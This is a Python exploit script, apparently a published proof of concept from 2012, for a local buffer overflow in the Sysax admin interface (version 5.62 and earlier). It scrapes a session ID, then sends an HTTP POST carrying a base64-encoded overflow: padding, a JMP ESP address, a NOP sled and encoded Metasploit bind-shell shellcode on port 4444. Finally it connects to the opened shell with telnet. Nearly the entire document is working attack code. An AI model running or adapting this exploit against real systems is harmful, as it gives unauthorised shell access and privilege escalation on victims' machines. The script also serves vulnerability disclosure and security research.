#!/usr/bin/python
##########################################################################################################
#Title: Sysax <= 5.62 Admin Interface Local Buffer Overflow
#Author: Craig Freyman (@cd1zz)
#Tested on: XP SP3 32bit
#Date Discovered: June 15, 2012
#Vendor Contacted: June 19, 2012
#Details: http://www.pwnag3.com/2012/06/sysax-admin-interface-local-priv.html
##########################################################################################################

import socket,sys,time,re,base64,subprocess

def main():
	global login
	print "\n"
	print "****************************************************************************"
	print "        Sysax <= 5.62 Admin Interface Local Buffer Overflow                 "
	print "     	  	         by @cd1zz www.pwnag3.com                              "
	print "****************************************************************************"

	#initial GET
	login = "GET /scgi? HTTP/1.1\r\n"
	login +="Host: localhost:88\r\n"
	login += "Referer: http://localhost:88\r\n\r\n"

	try:
		r = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		r.connect((target, port))
		print "[+] Accessing admin interface"
		r.send(login)
	except Exception, e:
		print "[-] There was a problem"
		print e
	
	#loop the recv sock so we get the full page
	page = ''	
	fullpage = ''	
	while "</html>" not in fullpage:
		page = r.recv(4096)
		fullpage += page
	time.sleep(1)

	#regex the sid from the page
	global sid
	sid = re.search(r'sid=[a-zA-Z0-9]{40}',fullpage,re.M)
	if sid is None:
		print "[-] There was a problem finding your SID"
		sys.exit(1)
	time.sleep(1)
	r.close()

def exploit():
	#msfpayload windows/shell_bind_tcp LPORT=4444 R | msfencode -e x86/shikata_ga_nai -b "\x00\x0a\x0d"
	shell = (
	"\xdb\xd5\xd9\x74\x24\xf4\xb8\xc3\x8f\xb3\x3e\x5b\x33\xc9"
	"\xb1\x56\x31\x43\x18\x03\x43\x18\x83\xeb\x3f\x6d\x46\xc2"
	"\x57\xfb\xa9\x3b\xa7\x9c\x20\xde\x96\x8e\x57\xaa\x8a\x1e"
	"\x13\xfe\x26\xd4\x71\xeb\xbd\x98\x5d\x1c\x76\x16\xb8\x13"
	"\x87\x96\x04\xff\x4b\xb8\xf8\x02\x9f\x1a\xc0\xcc\xd2\x5b"
	"\x05\x30\x1c\x09\xde\x3e\x8e\xbe\x6b\x02\x12\xbe\xbb\x08"
	"\x2a\xb8\xbe\xcf\xde\x72\xc0\x1f\x4e\x08\x8a\x87\xe5\x56"
	"\x2b\xb9\x2a\x85\x17\xf0\x47\x7e\xe3\x03\x81\x4e\x0c\x32"
	"\xed\x1d\x33\xfa\xe0\x5c\x73\x3d\x1a\x2b\x8f\x3d\xa7\x2c"
	"\x54\x3f\x73\xb8\x49\xe7\xf0\x1a\xaa\x19\xd5\xfd\x39\x15"
	"\x92\x8a\x66\x3a\x25\x5e\x1d\x46\xae\x61\xf2\xce\xf4\x45"
	"\xd6\x8b\xaf\xe4\x4f\x76\x1e\x18\x8f\xde\xff\xbc\xdb\xcd"
	"\x14\xc6\x81\x99\xd9\xf5\x39\x5a\x75\x8d\x4a\x68\xda\x25"
	"\xc5\xc0\x93\xe3\x12\x26\x8e\x54\x8c\xd9\x30\xa5\x84\x1d"
	"\x64\xf5\xbe\xb4\x04\x9e\x3e\x38\xd1\x31\x6f\x96\x89\xf1"
	"\xdf\x56\x79\x9a\x35\x59\xa6\xba\x35\xb3\xd1\xfc\xfb\xe7"
	"\xb2\x6a\xfe\x17\x25\x37\x77\xf1\x2f\xd7\xd1\xa9\xc7\x15"
	"\x06\x62\x70\x65\x6c\xde\x29\xf1\x38\x08\xed\xfe\xb8\x1e"
	"\x5e\x52\x10\xc9\x14\xb8\xa5\xe8\x2b\x95\x8d\x63\x14\x7e"
	"\x47\x1a\xd7\x1e\x58\x37\x8f\x83\xcb\xdc\x4f\xcd\xf7\x4a"
	"\x18\x9a\xc6\x82\xcc\x36\x70\x3d\xf2\xca\xe4\x06\xb6\x10"
	"\xd5\x89\x37\xd4\x61\xae\x27\x20\x69\xea\x13\xfc\x3c\xa4"
	"\xcd\xba\x96\x06\xa7\x14\x44\xc1\x2f\xe0\xa6\xd2\x29\xed"
	"\xe2\xa4\xd5\x5c\x5b\xf1\xea\x51\x0b\xf5\x93\x8f\xab\xfa"
	"\x4e\x14\xdb\xb0\xd2\x3d\x74\x1d\x87\x7f\x19\x9e\x72\x43"
	"\x24\x1d\x76\x3c\xd3\x3d\xf3\x39\x9f\xf9\xe8\x33\xb0\x6f"
	"\x0e\xe7\xb1\xa5")
	
	nops = "\x90" * 20
	#7CA7A787 FFE4 JMP ESP shell32.dll v6.00.2900.6072
	jmp_esp = "\x87\xA7\xA7\x7C"
	payload = base64.b64encode(("A" * 392 + jmp_esp + nops + shell + nops))
	
	#setup exploit
	exploit = "POST /scgi?"+str(sid.group(0))+"&pid=scriptpathbrowse2.htm HTTP/1.1\r\n"
	exploit += "Host: localhost:88\r\n"
	exploit += "Content-Type: application/x-www-form-urlencoded\r\n"
	exploit += "Content-Length: "+ str(len(payload)+3)+"\r\n\r\n"
	exploit += "e2="+payload+"\r\n\r\n"

	try:
		r = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
		r.connect((target, port))
		print "[+] Sending pwnag3"
		r.send(exploit)
	except Exception, e:
		print "[-] There was a problem"
		print e
	time.sleep(2)
	print "[+] Here is your shell..."
	subprocess.Popen("telnet localhost 4444", shell=True).wait()
	sys.exit(1)

if __name__ == '__main__':
	if len(sys.argv) != 1:
		print "[-] Usage: %s"
		sys.exit(1)
	
	#by default it binds to 127.0.0.1 on 88
	target = "127.0.0.1"
	port = 88
	main()
	exploit()